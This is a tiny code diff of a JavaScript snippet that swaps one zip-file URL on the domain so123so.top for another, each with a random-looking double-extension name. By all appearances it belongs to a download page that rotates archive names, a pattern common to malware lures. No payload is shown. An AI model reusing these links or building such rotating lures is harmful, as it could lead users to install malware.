@@ -1,3 +1,3 @@
 (function() {
-    window.filename = 'https://dows.so123so.top/syouwamgxi.ivo.zip';
+    window.filename = 'https://dows.so123so.top/stwanyonxipts.znm.zip';
 })();
